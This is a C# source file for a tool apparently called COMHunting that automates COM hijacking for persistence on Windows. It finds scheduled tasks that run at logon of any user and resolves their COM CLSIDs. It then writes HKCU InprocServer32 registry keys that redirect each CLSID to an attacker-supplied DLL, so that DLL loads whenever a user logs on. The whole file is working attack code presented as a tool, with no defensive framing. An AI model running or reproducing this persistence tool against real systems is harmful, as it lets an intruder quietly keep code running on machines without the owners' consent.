using System;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace COMHunting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            EnumAllTasks(args[0]);
        }

        //Enumerates all scheduled tasks using dahall's TaskScheduler project
        static void EnumAllTasks(string dllPath)
        {
            using (TaskService ts = new TaskService())
                EnumFolderTasks(ts.RootFolder, dllPath);
        }

        static void EnumFolderTasks(TaskFolder fld, string pathToDLL)
        {
            foreach (Task task in fld.Tasks)
            {
                //Check if the scheduled task is enabled, and if it contains triggers
                if (task.Definition.Triggers.Count > 0 && task.Enabled)
                {
                    if (task.Definition.Principal.GroupId == "Users")
                    {
                        //Checks if the task is triggered at log on of any user
                        if (task.Definition.Triggers.ToString().Contains("At log on of any user"))
                        {
                            COMHijackingOpts(task, pathToDLL);
                        }
                        //If the task contains multiple triggers, loop over them and check for at log on of any user
                        else if (task.Definition.Triggers.ToString().Contains("Multiple triggers defined"))
                        {
                            foreach (Trigger trigger in task.Definition.Triggers.ToArray())
                            {
                                if (task.Definition.Triggers[trigger.Id].ToString() == "At log on of any user")
                                {
                                    COMHijackingOpts(task, pathToDLL);
                                }
                            }
                        }
                    }
                }
            }
            foreach (TaskFolder sfld in fld.SubFolders)
            {
                EnumFolderTasks(sfld, pathToDLL);
            }
        }

        //Retrieve the CLSID and check registry keys
        static void COMHijackingOpts(Task task, string dllPath)
        {
            foreach (Microsoft.Win32.TaskScheduler.Action act in task.Definition.Actions.ToArray())
            {
                //Extract the CLSID
                string clsid = act.ToString().Split('(')[1].Split(')')[0].ToUpper();

                if (IsValidCOMHijack(clsid))
                {
                    Console.WriteLine("Task Name: " + task.Name);
                    Console.WriteLine("Task Path: " + task.Path);
                    Console.WriteLine("CLSID: " + clsid);
                    Console.WriteLine("Started Hijacking COM");
                    ReplaceDLL(clsid, dllPath);
                }
            }
        }

        //Check for InprocServer32
        static bool IsValidCOMHijack(string clsid)
        {
            bool isValidCOMHijack = false;
            string registryPath = @"\CLSID\{" + clsid + @"}\InprocServer32";
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(registryPath);

            if (key != null)
            {
                key.Close();

                if (NotInHKCU(clsid))
                {
                    isValidCOMHijack =  true;
                }
            }
            return isValidCOMHijack;
        }

        //Check if the CLSID exists in HKCU to validate our hijack
        static bool NotInHKCU(string clsid)
        {
            string registryPath = @"Software\Classes\CLSID\{" + clsid + "}";
            RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath);

            if (key == null)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        //Create the desired registry keys in order to hijack COM for persistence
        static void ReplaceDLL(string clsid, string dllPath)
        {
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}");
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InprocServer32", true);
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InprocServer32", true);
            key.SetValue("", dllPath);
            key.SetValue("ThreadingModel", "Both");
            
            Console.WriteLine("Hijacked COM Succesfully, exiting NOW!");

            Environment.Exit(0);
        }
    }
}